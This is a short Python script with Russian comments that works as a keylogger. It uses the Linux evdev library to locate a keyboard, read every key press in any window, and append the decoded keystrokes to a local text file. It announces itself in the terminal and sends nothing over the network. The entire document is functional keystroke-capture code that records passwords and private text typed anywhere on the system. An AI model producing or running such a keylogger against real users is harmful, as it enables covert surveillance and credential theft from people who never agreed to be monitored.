import os
import evdev
from evdev import InputDevice, ecodes

# Наш точный путь к логу
LOG_FILE = "/home/samvel/Документы/IT/python/log.txt"

def find_keyboard():
    # Ищем среди всех устройств ввода то, у которого есть клавиши
    devices = [InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        # Проверяем имя устройства на наличие ключевых слов клавиатуры
        if "keyboard" in device.name.lower() or "kbd" in device.name.lower():
            return device.path
    # Если по имени не нашли, берем первый попавшийся девайс с поддержкой клавиш
    for device in devices:
        if 1 in device.capabilities():  # EV_KEY
            return device.path
    return None

kbd_path = find_keyboard()

if not kbd_path:
    print("❌ Клавиатура не найдена в системе!")
    exit()

print(f"✅ Найдено устройство клавиатуры: {kbd_path}")
device = InputDevice(kbd_path)

print("Слушатель клавиатуры запущен. Нажимайте клавиши в ЛЮБОМ окне...")
print("Для выхода нажмите Ctrl+C в терминале.")

try:
    for event in device.read_loop():
        # event.type == 1 означает событие клавиши (EV_KEY)
        # event.value == 1 означает именно нажатие (down), а не отпускание (up)
        if event.type == ecodes.EV_KEY and event.value == 1:
            # Получаем имя клавиши через встроенный словарь ecodes.KEY
            key_name = ecodes.KEY.get(event.code, f"KEY_{event.code}")
            
            # Убираем лишнюю приставку KEY_ для красивого лога
            if isinstance(key_name, list):
                key_name = key_name[0]  # На случай если вернулся список имён
                
            clean_key = key_name.replace("KEY_", "")
            
            # Форматируем пробел и энтер
            if clean_key == "SPACE":
                clean_key = " "
            elif clean_key == "ENTER":
                clean_key = "\n"
            else:
                if len(clean_key) > 1:
                    clean_key = f" [{clean_key}] "
                else:
                    clean_key = clean_key.lower() # переводим буквы в нижний регистр

            # Записываем в файл
            with open(LOG_FILE, "a", encoding="utf-8") as file:
                file.write(clean_key)
                
except KeyboardInterrupt:
    print("\n🏁 Работа завершена!")
